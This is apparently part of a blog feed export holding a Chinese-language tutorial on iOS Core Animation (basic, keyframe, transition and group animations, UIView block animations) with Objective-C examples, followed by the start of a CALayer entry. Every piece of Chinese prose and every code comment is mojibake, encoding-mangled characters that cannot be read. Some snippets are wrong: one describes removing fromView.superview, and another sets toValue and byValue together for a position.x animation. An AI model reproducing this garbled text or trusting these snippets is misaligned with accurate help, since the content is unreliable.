keyPathç›¸åº”å±žæ€§çš„ç»“æŸå€¼ éšç€åŠ¨ç”»çš„è¿›è¡Œï¼Œåœ¨é•¿åº¦ä¸ºdurationçš„æŒç»­æ—¶é—´å†…ï¼ŒkeyPathç›¸åº”å±žæ€§çš„å€¼ä»ŽfromValueæ¸æ¸åœ°å˜ä¸ºtoValueã€‚ å¦‚æžœfillMode=kCAFillModeForwardså’ŒremovedOnComletion=NOï¼Œé‚£ä¹ˆåœ¨åŠ¨ç”»æ‰§è¡Œå®Œæ¯•åŽï¼Œå›¾å±‚ä¼šä¿æŒæ˜¾ç¤ºåŠ¨ç”»æ‰§è¡ŒåŽçš„çŠ¶æ€ã€‚ ä½†åœ¨å®žè´¨ä¸Šï¼Œå›¾å±‚çš„å±žæ€§å€¼è¿˜æ˜¯åŠ¨ç”»æ‰§è¡Œå‰çš„åˆå§‹å€¼ï¼Œå¹¶æ²¡æœ‰çœŸæ­£è¢«æ”¹å˜ã€‚ æ¯”å¦‚ï¼ŒCALayerçš„positionåˆå§‹å€¼ä¸º(0,0)ï¼ŒCABasicAnimationçš„fromValueä¸º(10,10)ï¼ŒtoValueä¸º(100,100)ï¼Œè™½ç„¶åŠ¨ç”»æ‰§è¡Œå®Œæ¯•åŽå›¾å±‚ä¿æŒåœ¨(100,100)è¿™ä¸ªä½ç½®ï¼Œå®žè´¨ä¸Šå›¾å±‚çš„positionè¿˜æ˜¯ä¸º(0,0)ã€‚ keyPath(å®˜æ–¹æ–‡æ¡£æˆªå›¾) 3Dçš„å½¢å˜å±žæ€§ åœ¨æ–‡æ¡£çš„CATransform3D key paths è¿™ä¸ªä½ç½®æŸ¥çœ‹keyPathçš„å±žæ€§å’ŒåŒ…è£…çš„æ•°å€¼ã€‚ 12345678910111213141516171819202122232425/** X Y è½´çš„åŠ¨ç”» */- (void)demoTransform&#123; // åˆ›å»ºåŸºæœ¬åŠ¨ç”» CABasicAnimation *anim = [CABasicAnimation animation]; // keyPathå†³å®šäº†æ‰§è¡Œæ€Žæ ·çš„åŠ¨ç”»(ä»€ä¹ˆå±žæ€§çš„åŠ¨ç”») anim.keyPath = @"transform.translation.y"; // toValue : è¾¾åˆ°åˆ°çš„æ•°å€¼ // byValue : å¢žåŠ æŸä¸€ä¸ªæ•°å€¼ anim.toValue = @(250);// anim.toValue = [NSValue valueWithCATransform3D:CATransform3DMakeScale(0.5, 2, 0)]; // åŠ¨ç”»çš„æ‰§è¡Œæ—¶é—´ anim.duration = 2.0;#pragma mark - è®©å›¾å±‚ä¿æŒåœ¨åŠ¨ç”»æ‰§è¡Œå®Œçš„çŠ¶æ€ ä¸€å®šè¦åŠ è¿™ä¸¤å¥ // åŠ¨ç”»æ‰§è¡Œå®Œä¸è¦ç§»é™¤ anim.removedOnCompletion = NO; // ä¿æŒåœ¨ç›®å‰çš„çŠ¶æ€ä½ç½® anim.fillMode = kCAFillModeForwards; [self.layer addAnimation:anim forKey:nil]; // forKeyæ˜¯ç”¨æ¥æ ‡è®°åŠ¨ç”» ç§»é™¤çš„æ—¶å€™ç”¨&#125; ä½ç½®å±žæ€§çš„åŸºæœ¬åŠ¨ç”»1234567891011121314151617181920212223/** ä½ç½®å±žæ€§çš„åŸºæœ¬åŠ¨ç”» */- (void)demoPosition&#123; // åˆ›å»ºåŸºæœ¬åŠ¨ç”» CABasicAnimation *anim = [CABasicAnimation animation]; // keyPathå†³å®šäº†æ‰§è¡Œæ€Žæ ·çš„åŠ¨ç”»(ä»€ä¹ˆå±žæ€§çš„åŠ¨ç”») anim.keyPath = @"position.x"; // toValue : è¾¾åˆ°åˆ°çš„æ•°å€¼ // byValue : å¢žåŠ æŸä¸€ä¸ªæ•°å€¼ anim.toValue = [NSValue valueWithCGPoint:CGPointMake(250, 250)]; anim.byValue = [NSValue valueWithCGPoint:CGPointMake(250, 250)];#pragma mark - è®©å›¾å±‚ä¿æŒåœ¨åŠ¨ç”»æ‰§è¡Œå®Œçš„çŠ¶æ€ ä¸€å®šè¦åŠ è¿™ä¸¤å¥ // åŠ¨ç”»æ‰§è¡Œå®Œä¸è¦ç§»é™¤ anim.removedOnCompletion = NO; // ä¿æŒåœ¨ç›®å‰çš„çŠ¶æ€ä½ç½® anim.fillMode = kCAFillModeForwards; [self.layer addAnimation:anim forKey:nil]; // forKeyæ˜¯ç”¨æ¥æ ‡è®°åŠ¨ç”» ç§»é™¤çš„æ—¶å€™ç”¨&#125; æ—‹è½¬å±žæ€§çš„åŸºæœ¬åŠ¨ç”»12345678910111213141516171819202122232425/** æ—‹è½¬å±žæ€§çš„åŸºæœ¬åŠ¨ç”» */- (void)demoRotation&#123; // åˆ›å»ºåŸºæœ¬åŠ¨ç”» CABasicAnimation *anim = [CABasicAnimation animation]; // keyPathå†³å®šäº†æ‰§è¡Œæ€Žæ ·çš„åŠ¨ç”»(ä»€ä¹ˆå±žæ€§çš„åŠ¨ç”») anim.keyPath = @"transform.rotation"; // toValue : è¾¾åˆ°åˆ°çš„æ•°å€¼ // byValue : å¢žåŠ æŸä¸€ä¸ªæ•°å€¼ anim.toValue = [NSValue valueWithCATransform3D:CATransform3DMakeRotation(M_2_PI, 1, -1, 0)];// anim.byValue = [NSValue valueWithCGPoint:CGPointMake(250, 250)]; // åŠ¨ç”»çš„æ‰§è¡Œæ—¶é—´ anim.duration = 2.0;#pragma mark - è®©å›¾å±‚ä¿æŒåœ¨åŠ¨ç”»æ‰§è¡Œå®Œçš„çŠ¶æ€ ä¸€å®šè¦åŠ è¿™ä¸¤å¥ // åŠ¨ç”»æ‰§è¡Œå®Œä¸è¦ç§»é™¤ anim.removedOnCompletion = NO; // ä¿æŒåœ¨ç›®å‰çš„çŠ¶æ€ä½ç½® anim.fillMode = kCAFillModeForwards; [self.layer addAnimation:anim forKey:nil]; // forKeyæ˜¯ç”¨æ¥æ ‡è®°åŠ¨ç”» ç§»é™¤çš„æ—¶å€™ç”¨&#125; ç¼©æ”¾å±žæ€§çš„åŸºæœ¬åŠ¨ç”»123456789101112131415161718192021222324252627/** ç¼©æ”¾å±žæ€§çš„åŸºæœ¬åŠ¨ç”» */- (void)demoScale&#123; // åˆ›å»ºåŸºæœ¬åŠ¨ç”» CABasicAnimation *anim = [CABasicAnimation animation]; // keyPathå†³å®šäº†æ‰§è¡Œæ€Žæ ·çš„åŠ¨ç”»(ä»€ä¹ˆå±žæ€§çš„åŠ¨ç”») anim.keyPath = @"transform.scale";// anim.keyPath = @"transform";// anim.keyPath = @"bounds";// // toValue : è¾¾åˆ°åˆ°çš„æ•°å€¼ // byValue : å¢žåŠ æŸä¸€ä¸ªæ•°å€¼ anim.toValue = [NSValue valueWithCATransform3D:CATransform3DMakeScale(0.5, 2, 0)]; // anim.byValue = [NSValue valueWithCGPoint:CGPointMake(250, 250)]; // åŠ¨ç”»çš„æ‰§è¡Œæ—¶é—´ anim.duration = 2.0;#pragma mark - è®©å›¾å±‚ä¿æŒåœ¨åŠ¨ç”»æ‰§è¡Œå®Œçš„çŠ¶æ€ ä¸€å®šè¦åŠ è¿™ä¸¤å¥ // åŠ¨ç”»æ‰§è¡Œå®Œä¸è¦ç§»é™¤ anim.removedOnCompletion = NO; // ä¿æŒåœ¨ç›®å‰çš„çŠ¶æ€ä½ç½® anim.fillMode = kCAFillModeForwards; [self.layer addAnimation:anim forKey:nil]; // forKeyæ˜¯ç”¨æ¥æ ‡è®°åŠ¨ç”» ç§»é™¤çš„æ—¶å€™ç”¨&#125; keyFrameAnimation ï¼ˆå…³é”®å¸§åŠ¨ç”»ï¼‰ keyFrameAnimationæ˜¯CApropertyAnimationçš„å­ç±»ï¼Œè·ŸCABasicAnimationçš„åŒºåˆ«æ˜¯ï¼š CABasicAnimationåªèƒ½ä»Žä¸€ä¸ªæ•°å€¼(fromValue)å˜åˆ°å¦ä¸€ä¸ªæ•°å€¼(toValue) è€ŒCAKeyframeAnimationä¼šä½¿ç”¨ä¸€ä¸ªNSArrayä¿å­˜è¿™äº›æ•°å€¼ å±žæ€§è¯´æ˜Žï¼š valuesï¼šå°±æ˜¯ä¸Šè¿°çš„NSArrayå¯¹è±¡ã€‚é‡Œé¢çš„å…ƒç´ ç§°ä¸ºâ€å…³é”®å¸§â€(keyframe)ã€‚åŠ¨ç”»å¯¹è±¡ä¼šåœ¨æŒ‡å®šçš„æ—¶é—´(duration)å†…ï¼Œä¾æ¬¡æ˜¾ç¤ºvaluesæ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå…³é”®å¸§ pathï¼šå¯ä»¥è®¾ç½®ä¸€ä¸ªCGPathRef\CGMutablePathRef,è®©å±‚è·Ÿç€è·¯å¾„ç§»åŠ¨ã€‚pathåªå¯¹CALayerçš„anchorPointå’Œpositionèµ·ä½œç”¨ã€‚å¦‚æžœä½ è®¾ç½®äº†pathï¼Œé‚£ä¹ˆvalueså°†è¢«å¿½ç•¥ã€‚ keyTimesï¼šå¯ä»¥ä¸ºå¯¹åº”çš„å…³é”®å¸§æŒ‡å®šå¯¹åº”çš„æ—¶é—´ç‚¹,å…¶å–å€¼èŒƒå›´ä¸º0åˆ°1.0ã€‚keyTimesä¸­çš„æ¯ä¸€ä¸ªæ—¶é—´å€¼éƒ½å¯¹åº”valuesä¸­çš„æ¯ä¸€å¸§.å½“keyTimesæ²¡æœ‰è®¾ç½®çš„æ—¶å€™,å„ä¸ªå…³é”®å¸§çš„æ—¶é—´æ˜¯å¹³åˆ†çš„ã€‚ CABasicAnimationå¯çœ‹åšæ˜¯æœ€å¤šåªæœ‰2ä¸ªå…³é”®å¸§çš„CAKeyframeAnimationã€‚ å¸§åŠ¨ç”»çš„åŸºæœ¬ä½¿ç”¨123456789101112131415161718192021222324- (void)demo&#123; // åˆ›å»ºå¸§åŠ¨ç”» CAKeyframeAnimation *anim = [CAKeyframeAnimation animation]; anim.keyPath = @"position"; // å¯ä»¥æ·»åŠ å¤šä¸ªå€¼æ‰§è¡ŒåŠ¨ç”» NSValue *value1 = [NSValue valueWithCGPoint:CGPointZero]; NSValue *value2 = [NSValue valueWithCGPoint:CGPointMake(50, 50)]; NSValue *value3 = [NSValue valueWithCGPoint:CGPointMake(100, 150)]; NSValue *value4 = [NSValue valueWithCGPoint:CGPointMake(250, 50)]; anim.values = @[value1,value2,value3,value4]; // æŒç»­æ—¶é—´ä¸¤ç§’ anim.duration = 2.0; // åŠ¨ç”»è¿‡åŽä¿æŒçŽ°åœ¨çš„çŠ¶æ€ anim.removedOnCompletion = NO; anim.fillMode = kCAFillModeForwards; // æ·»åŠ åŠ¨ç”» [self.purpleView.layer addAnimation:anim forKey:nil];&#125; animation.pathæ–¹æ³•123456789101112131415161718192021222324252627282930313233343536373839/** è®©viewæ²¿ç€ç»˜åˆ¶çš„è·¯å¾„æ‰§è¡ŒåŠ¨ç”» */- (void)demoCircle&#123; // åˆ›å»ºåŠ¨ç”» CAKeyframeAnimation *anim = [CAKeyframeAnimation animation]; anim.keyPath = @"position"; anim.removedOnCompletion = NO; anim.fillMode = kCAFillModeForwards; anim.duration = 2.0; // ç»˜åˆ¶åœ†è·¯å¾„ CGMutablePathRef path = CGPathCreateMutable(); CGPathAddEllipseInRect(path, NULL, CGRectMake(100, 100, 250, 250)); anim.path = path; CGPathRelease(path); // æœ‰åˆ›å»ºå°±è¦æ‰‹åŠ¨ release anim.delegate = self; // ä»£ç†å°±æ˜¯view ä¸éœ€è¦éµå®ˆåè®® // åŠ¨ç”»æ–¹ç¨‹(åŠ¨ç”»çš„æ‰§è¡Œæ–¹å¼) anim.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut]; // æ·»åŠ åŠ¨ç”» [self.purpleView.layer addAnimation:anim forKey:nil];&#125;#pragma mark - Animationä»£ç†æ–¹æ³•/** åŠ¨ç”»å¼€å§‹è°ƒç”¨çš„æ–¹æ³• */- (void)animationDidStart:(CAAnimation *)anim&#123; NSLog(@"%s",__func__);&#125;/** åŠ¨ç”»æ‰§è¡Œç»“æŸè°ƒç”¨çš„æ–¹æ³• */- (void)animationDidStop:(CAAnimation *)anim finished:(BOOL)flag&#123; NSLog(@"%s",__func__);&#125; å›¾æ ‡æŠ–åŠ¨(æ¨¡ä»¿Appåˆ é™¤)123456789101112131415161718192021- (IBAction)star &#123; CAKeyframeAnimation *anim = [CAKeyframeAnimation animation]; anim.keyPath = @"transform.rotation"; // è®¾ç½®æ‘†åŠ¨è§’åº¦ anim.values = @[@(Angle2Radian(-7)),@(Angle2Radian(7)),@(Angle2Radian(-7))]; anim.duration = 0.15; // æ‰§è¡Œæ¬¡æ•° anim.repeatCount = CGFLOAT_MAX; anim.removedOnCompletion = NO; anim.fillMode = kCAFillModeForwards; [self.iconView.layer addAnimation:anim forKey:@"shake"];&#125;- (IBAction)stop &#123; [self.iconView.layer removeAnimationForKey:@"shake"];&#125; CATransition CAAnimationçš„å­ç±»ï¼Œç”¨äºŽåšè½¬åœºåŠ¨ç”»ï¼Œèƒ½å¤Ÿä¸ºå±‚æä¾›ç§»å‡ºå±å¹•å’Œç§»å…¥å±å¹•çš„åŠ¨ç”»æ•ˆæžœã€‚iOSæ¯”Mac OS Xçš„è½¬åœºåŠ¨ç”»æ•ˆæžœå°‘ä¸€ç‚¹ã€‚ UINavigationControllerå°±æ˜¯é€šè¿‡CATransitionå®žçŽ°äº†å°†æŽ§åˆ¶å™¨çš„è§†å›¾æŽ¨å…¥å±å¹•çš„åŠ¨ç”»æ•ˆæžœã€‚ å±žæ€§è§£æž: typeï¼šåŠ¨ç”»è¿‡æ¸¡ç±»åž‹ subtypeï¼šåŠ¨ç”»è¿‡æ¸¡æ–¹å‘ startProgressï¼šåŠ¨ç”»èµ·ç‚¹(åœ¨æ•´ä½“åŠ¨ç”»çš„ç™¾åˆ†æ¯”) endProgressï¼šåŠ¨ç”»ç»ˆç‚¹(åœ¨æ•´ä½“åŠ¨ç”»çš„ç™¾åˆ†æ¯”) è½¬åœºåŠ¨ç”»è¿‡æ¸¡æ•ˆæžœ CAAnimationGroup CAAnimationçš„å­ç±»ï¼Œå¯ä»¥ä¿å­˜ä¸€ç»„åŠ¨ç”»å¯¹è±¡ï¼Œå°†CAAnimationGroupå¯¹è±¡åŠ å…¥å±‚åŽï¼Œç»„ä¸­æ‰€æœ‰åŠ¨ç”»å¯¹è±¡å¯ä»¥åŒæ—¶å¹¶å‘è¿è¡Œã€‚ å±žæ€§è§£æžï¼š animationsï¼šç”¨æ¥ä¿å­˜ä¸€ç»„åŠ¨ç”»å¯¹è±¡çš„NSArrayã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ç»„åŠ¨ç”»å¯¹è±¡æ˜¯åŒæ—¶è¿è¡Œçš„ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®åŠ¨ç”»å¯¹è±¡çš„beginTimeå±žæ€§æ¥æ›´æ”¹åŠ¨ç”»çš„å¼€å§‹æ—¶é—´ã€‚ 1234567891011121314151617181920212223// å°†å¤šä¸ªæ ¸å¿ƒåŠ¨ç”»æ”¾åœ¨åŠ¨ç”»ç»„é‡Œé¢ä¸€èµ·æ‰§è¡Œ- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event&#123; // åŠ¨ç”»1 CABasicAnimation *animRotate = [CABasicAnimation animation]; animRotate.keyPath = @"transform.rotation"; animRotate.toValue = @(M_2_PI); // åŠ¨ç”»2 CABasicAnimation *animScale= [CABasicAnimation animation]; animScale.keyPath = @"transform.scale"; animScale.toValue = @(0.5); // åŠ¨ç”»3 CABasicAnimation *animTranslate = [CABasicAnimation animation]; animTranslate.keyPath = @"transform.translation"; animTranslate.toValue = @(100); // æ”¾åœ¨åŠ¨ç”»ç»„é‡Œé¢ CAAnimationGroup *animGroup = [CAAnimationGroup animation]; animGroup.animations = @[animRotate,animScale,animTranslate]; animGroup.removedOnCompletion = NO; animGroup.fillMode = kCAFillModeForwards; animGroup.duration = 3.0; [self.cyanView.layer addAnimation:animGroup forKey:nil];&#125; UIViewåŠ¨ç”»å°è£… UIKitç›´æŽ¥å°†åŠ¨ç”»é›†æˆåˆ°UIViewç±»ä¸­ï¼Œå½“å†…éƒ¨çš„ä¸€äº›å±žæ€§å‘ç”Ÿæ”¹å˜æ—¶ï¼ŒUIViewå°†ä¸ºè¿™äº›æ”¹å˜æä¾›åŠ¨ç”»æ”¯æŒã€‚ æ‰§è¡ŒåŠ¨ç”»æ‰€éœ€è¦çš„å·¥ä½œç”±UIViewç±»è‡ªåŠ¨å®Œæˆï¼Œä½†ä»è¦åœ¨å¸Œæœ›æ‰§è¡ŒåŠ¨ç”»æ—¶é€šçŸ¥è§†å›¾ï¼Œä¸ºæ­¤éœ€è¦å°†æ”¹å˜å±žæ€§çš„ä»£ç æ”¾åœ¨[UIView beginAnimations:nil context:nil]å’Œ[UIView commitAnimations]ä¹‹é—´ã€‚ å¸¸è§æ–¹æ³•è§£æž: 1234567891011121314151617181920212223242526272829// è®¾ç½®åŠ¨ç”»ä»£ç†å¯¹è±¡ï¼Œå½“åŠ¨ç”»å¼€å§‹æˆ–è€…ç»“æŸæ—¶ä¼šå‘æ¶ˆæ¯ç»™ä»£ç†å¯¹è±¡+ (void)setAnimationDelegate:(id)delegate// å½“åŠ¨ç”»å³å°†å¼€å§‹æ—¶ï¼Œæ‰§è¡Œdelegateå¯¹è±¡çš„selectorï¼Œå¹¶ä¸”æŠŠbeginAnimations:context:ä¸­ä¼ å…¥çš„å‚æ•°ä¼ è¿›selector+ (void)setAnimationWillStartSelector:(SEL)selector// å½“åŠ¨ç”»ç»“æŸæ—¶ï¼Œæ‰§è¡Œdelegateå¯¹è±¡çš„selectorï¼Œå¹¶ä¸”æŠŠbeginAnimations:context:ä¸­ä¼ å…¥çš„å‚æ•°ä¼ è¿›selector+ (void)setAnimationDidStopSelector:(SEL)selector// åŠ¨ç”»çš„æŒç»­æ—¶é—´ï¼Œç§’ä¸ºå•ä½+ (void)setAnimationDuration:(NSTimeInterval)duration// åŠ¨ç”»å»¶è¿Ÿdelayç§’åŽå†å¼€å§‹+ (void)setAnimationDelay:(NSTimeInterval)delay// åŠ¨ç”»çš„å¼€å§‹æ—¶é—´ï¼Œé»˜è®¤ä¸ºnow+ (void)setAnimationStartDate:(NSDate *)startDate// åŠ¨ç”»çš„èŠ‚å¥æŽ§åˆ¶,å…·ä½“çœ‹ä¸‹é¢çš„â€å¤‡æ³¨â€+ (void)setAnimationCurve:(UIViewAnimationCurve)curve// åŠ¨ç”»çš„é‡å¤æ¬¡æ•°+ (void)setAnimationRepeatCount:(float)repeatCount// å¦‚æžœè®¾ç½®ä¸ºYES,ä»£è¡¨åŠ¨ç”»æ¯æ¬¡é‡å¤æ‰§è¡Œçš„æ•ˆæžœä¼šè·Ÿä¸Šä¸€æ¬¡ç›¸å+ (void)setAnimationRepeatAutoreverses:(BOOL)repeatAutoreverses// è®¾ç½®è§†å›¾viewçš„è¿‡æ¸¡æ•ˆæžœ, transitionæŒ‡å®šè¿‡æ¸¡ç±»åž‹, cacheè®¾ç½®YESä»£è¡¨ä½¿ç”¨è§†å›¾ç¼“å­˜ï¼Œæ€§èƒ½è¾ƒå¥½+ (void)setAnimationTransition:(UIViewAnimationTransition)transition forView:(UIView *)view cache:(BOOL)cache BlockåŠ¨ç”»åŠ¨ç”»1 durationï¼šåŠ¨ç”»çš„æŒç»­æ—¶é—´ delayï¼šåŠ¨ç”»å»¶è¿Ÿdelayç§’åŽå¼€å§‹ optionsï¼šåŠ¨ç”»çš„èŠ‚å¥æŽ§åˆ¶ animationsï¼šå°†æ”¹å˜è§†å›¾å±žæ€§çš„ä»£ç æ”¾åœ¨è¿™ä¸ªblockä¸­ completionï¼šåŠ¨ç”»ç»“æŸåŽï¼Œä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªblock 1+ (void)animateWithDuration:(NSTimeInterval)duration delay:(NSTimeInterval)delay options:(UIViewAnimationOptions)options animations:(void (^)(void))animations completion:(void (^)(BOOL finished))completion åŠ¨ç”»2 durationï¼šåŠ¨ç”»çš„æŒç»­æ—¶é—´ viewï¼šéœ€è¦è¿›è¡Œè½¬åœºåŠ¨ç”»çš„è§†å›¾ optionsï¼šè½¬åœºåŠ¨ç”»çš„ç±»åž‹ animationsï¼šå°†æ”¹å˜è§†å›¾å±žæ€§çš„ä»£ç æ”¾åœ¨è¿™ä¸ªblockä¸­ completionï¼šåŠ¨ç”»ç»“æŸåŽï¼Œä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªblock 1+ (void)transitionWithView:(UIView *)view duration:(NSTimeInterval)duration options:(UIViewAnimationOptions)options animations:(void (^)(void))animations completion:(void (^)(BOOL finished))completion åŠ¨ç”»3 durationï¼šåŠ¨ç”»çš„æŒç»­æ—¶é—´ optionsï¼šè½¬åœºåŠ¨ç”»çš„ç±»åž‹ animationsï¼šå°†æ”¹å˜è§†å›¾å±žæ€§çš„ä»£ç æ”¾åœ¨è¿™ä¸ªblockä¸­ completionï¼šåŠ¨ç”»ç»“æŸåŽï¼Œä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªblock 1+ (void)transitionFromView:(UIView *)fromView toView:(UIView *)toView duration:(NSTimeInterval)duration options:(UIViewAnimationOptions)options completion:(void (^)(BOOL finished))completion æ–¹æ³•è°ƒç”¨å®Œæ¯•åŽï¼Œç›¸å½“äºŽæ‰§è¡Œäº†ä¸‹é¢ä¸¤å¥ä»£ç ï¼š 1234// æ·»åŠ toViewåˆ°çˆ¶è§†å›¾[fromView.superview addSubview:toView];// æŠŠfromViewä»Žçˆ¶è§†å›¾ä¸­ç§»é™¤[fromView.superview removeFromSuperview]; UIImageViewçš„å¸§åŠ¨ç”» UIImageViewå¯ä»¥è®©ä¸€ç³»åˆ—çš„å›¾ç‰‡åœ¨ç‰¹å®šçš„æ—¶é—´å†…æŒ‰é¡ºåºæ˜¾ç¤ºã€‚ ç›¸å…³å±žæ€§è§£æž: animationImagesï¼šè¦æ˜¾ç¤ºçš„å›¾ç‰‡(ä¸€ä¸ªè£…ç€UIImageçš„NSArray)ã€‚ animationDurationï¼šå®Œæ•´åœ°æ˜¾ç¤ºä¸€æ¬¡animationImagesä¸­çš„æ‰€æœ‰å›¾ç‰‡æ‰€éœ€çš„æ—¶é—´ã€‚ animationRepeatCountï¼šåŠ¨ç”»çš„æ‰§è¡Œæ¬¡æ•°(é»˜è®¤ä¸º0ï¼Œä»£è¡¨æ— é™å¾ªçŽ¯)ã€‚ ç›¸å…³æ–¹æ³•è§£æž: 123- (void)startAnimating; å¼€å§‹åŠ¨ç”»- (void)stopAnimating; åœæ­¢åŠ¨ç”»- (BOOL)isAnimating; æ˜¯å¦æ­£åœ¨è¿è¡ŒåŠ¨ç”» UIActivityIndicatorView æ˜¯ä¸€ä¸ªæ—‹è½¬è¿›åº¦è½®ï¼Œå¯ä»¥ç”¨æ¥å‘ŠçŸ¥ç”¨æˆ·æœ‰ä¸€ä¸ªæ“ä½œæ­£åœ¨è¿›è¡Œä¸­ï¼Œä¸€èˆ¬ç”¨initWithActivityIndicatorStyleåˆå§‹åŒ–ã€‚ UIActivityIndicatorViewStyleæœ‰3ä¸ªå€¼å¯ä¾›é€‰æ‹©ï¼š UIActivityIndicatorViewStyleWhiteLargeï¼šå¤§åž‹ç™½è‰²æŒ‡ç¤ºå™¨ UIActivityIndicatorViewStyleWhiteï¼šæ ‡å‡†å°ºå¯¸ç™½è‰²æŒ‡ç¤ºå™¨ UIActivityIndicatorViewStyleGrayï¼šç°è‰²æŒ‡ç¤ºå™¨ï¼Œç”¨äºŽç™½è‰²èƒŒæ™¯ æ–¹æ³•è§£æž: 123- (void)startAnimating; å¼€å§‹åŠ¨ç”»- (void)stopAnimating; åœæ­¢åŠ¨ç”»- (BOOL)isAnimating; æ˜¯å¦æ­£åœ¨è¿è¡ŒåŠ¨ç”»]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>CAAnimation</tag>
        <tag>CALayer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹æ ¸å¿ƒåŠ¨ç”»ï¼ˆä¸€ï¼‰ï¼šäº†è§£æ ¸å¿ƒåŠ¨ç”»åŠCALayerå¸¸ç”¨æ–¹æ³•ä»‹ç»]]></title>
    <url>%2Farchives%2F4bdf0e86.html</url>
    <content type="text"><![CDATA[é£’é£’ä¸œé£Žç»†é›¨æ¥ï¼ŒèŠ™è“‰å¡˜å¤–æœ‰è½»é›·ã€‚é‡‘èŸ¾å•®é”çƒ§é¦™å…¥ï¼ŒçŽ‰è™Žç‰µä¸æ±²äº•å›žã€‚è´¾æ°çª¥å¸˜éŸ©æŽ¾å°‘ï¼Œå®“å¦ƒç•™æž•é­çŽ‹æ‰ã€‚æ˜¥å¿ƒèŽ«å…±èŠ±äº‰å‘ï¼Œä¸€å¯¸ç›¸æ€ä¸€å¯¸ç°ï¼ æŽå•†éš ã€Šæ— é¢˜Â·é£’é£’ä¸œé£Žç»†é›¨æ¥ã€‹ æ ¸å¿ƒåŠ¨ç”»ä»‹ç»æœ¬è´¨ æ ¸å¿ƒåŠ¨ç”»éƒ½æ˜¯å‡è±¡ï¼Œå¹¶ä¸ä¼šæ”¹å˜layerçš„å±žæ€§å€¼ è€ŒUIViewåªæœ‰å±žæ€§æ”¹å˜æ‰ä¼šæœ‰åŠ¨ç”» ä½¿ç”¨åœºæ™¯: å¦‚æžœåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸éœ€è¦ç”¨æˆ·äº¤äº’ï¼Œå°±å¯ä»¥ç”¨æ ¸å¿ƒåŠ¨ç”» åœ¨è½¬åœºåŠ¨ç”»ä¸­ï¼Œæ ¸å¿ƒåŠ¨ç”»ç”¨å¾—æ¯”è¾ƒå¤š CAAnimationçš„ç»§æ‰¿ç»“æž„ï¼š è¦æƒ³æ‰§è¡ŒåŠ¨ç”»ï¼Œå°±å¿…é¡»åˆå§‹åŒ–ä¸€ä¸ªCAAnimationå¯¹è±¡ã€‚ å…¶å®žï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ¯”è¾ƒå¤šçš„æ˜¯CAAnimationçš„å­ç±»ï¼Œå› æ­¤ï¼Œå…ˆå¤§è‡´çœ‹çœ‹CAAnimationçš„ç»§æ‰¿ç»“æž„ï¼š CAAnimation æ‰€æœ‰åŠ¨ç”»å¯¹è±¡çš„çˆ¶ç±»ï¼Œè´Ÿè´£æŽ§åˆ¶åŠ¨ç”»çš„æŒç»­æ—¶é—´å’Œé€Ÿåº¦ï¼Œæ˜¯ä¸ªæŠ½è±¡ç±»ï¼Œä¸èƒ½ç›´æŽ¥ä½¿ç”¨ï¼Œåº”è¯¥ä½¿ç”¨å®ƒå…·ä½“çš„å­ç±»ã€‚ å±žæ€§è§£æžï¼š durationï¼šåŠ¨ç”»çš„æŒç»­æ—¶é—´ repeatCountï¼šåŠ¨ç”»çš„é‡å¤æ¬¡æ•° repeatDurationï¼šåŠ¨ç”»çš„é‡å¤æ—¶é—´ removedOnCompletionï¼šé»˜è®¤ä¸ºYESï¼Œä»£è¡¨åŠ¨ç”»æ‰§è¡Œå®Œæ¯•åŽå°±ä»Žå›¾å±‚ä¸Šç§»é™¤ï¼Œå›¾å½¢ä¼šæ¢å¤åˆ°åŠ¨ç”»æ‰§è¡Œå‰çš„çŠ¶æ€ã€‚å¦‚æžœæƒ³è®©å›¾å±‚ä¿æŒæ˜¾ç¤ºåŠ¨ç”»æ‰§è¡ŒåŽçš„çŠ¶æ€ï¼Œé‚£å°±è®¾ç½®ä¸ºNOï¼Œä¸è¿‡è¿˜è¦è®¾ç½®fillModeä¸ºkCAFillModeForwards fillModeï¼šå†³å®šå½“å‰å¯¹è±¡åœ¨éžactiveæ—¶é—´æ®µçš„è¡Œä¸º.æ¯”å¦‚åŠ¨ç”»å¼€å§‹ä¹‹å‰ï¼ŒåŠ¨ç”»ç»“æŸä¹‹åŽ beginTimeï¼šå¯ä»¥ç”¨æ¥è®¾ç½®åŠ¨ç”»å»¶è¿Ÿæ‰§è¡Œæ—¶é—´ï¼Œè‹¥æƒ³å»¶è¿Ÿ2sï¼Œå°±è®¾ç½®ä¸ºCACurrentMediaTime()+2ï¼ŒCACurrentMediaTime()ä¸ºå›¾å±‚çš„å½“å‰æ—¶é—´ timingFunctionï¼šé€Ÿåº¦æŽ§åˆ¶å‡½æ•°ï¼ŒæŽ§åˆ¶åŠ¨ç”»è¿è¡Œçš„èŠ‚å¥ delegateï¼šåŠ¨ç”»ä»£ç† timingFunctionå¯é€‰çš„å€¼æœ‰ï¼š 12345678// ï¼ˆçº¿æ€§ï¼‰ï¼šåŒ€é€Ÿï¼Œç»™ä½ ä¸€ä¸ªç›¸å¯¹é™æ€çš„æ„Ÿè§‰kCAMediaTimingFunctionLinear// ï¼ˆæ¸è¿›ï¼‰ï¼šåŠ¨ç”»ç¼“æ…¢è¿›å…¥ï¼Œç„¶åŽåŠ é€Ÿç¦»å¼€kCAMediaTimingFunctionEaseIn// ï¼ˆæ¸å‡ºï¼‰ï¼šåŠ¨ç”»å…¨é€Ÿè¿›å…¥ï¼Œç„¶åŽå‡é€Ÿçš„åˆ°è¾¾ç›®çš„åœ°kCAMediaTimingFunctionEaseOut// ï¼ˆæ¸è¿›æ¸å‡ºï¼‰ï¼šåŠ¨ç”»ç¼“æ…¢çš„è¿›å…¥ï¼Œä¸­é—´åŠ 